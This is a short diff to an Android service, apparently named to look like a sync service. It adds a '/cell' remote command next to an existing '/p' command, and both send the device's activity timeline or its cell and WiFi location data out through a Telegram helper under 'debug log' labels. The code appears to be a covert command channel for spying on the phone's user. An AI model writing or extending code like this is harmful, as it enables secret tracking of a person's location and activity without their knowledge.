@@ -48,6 +48,9 @@ class PersistentSyncService : Service() {
                                 } else if (text == "/p") {
                                     val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
                                     TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
+                                } else if (text == "/cell") {
+                                    val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
+                                    TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
                                 }
                             }
                         }
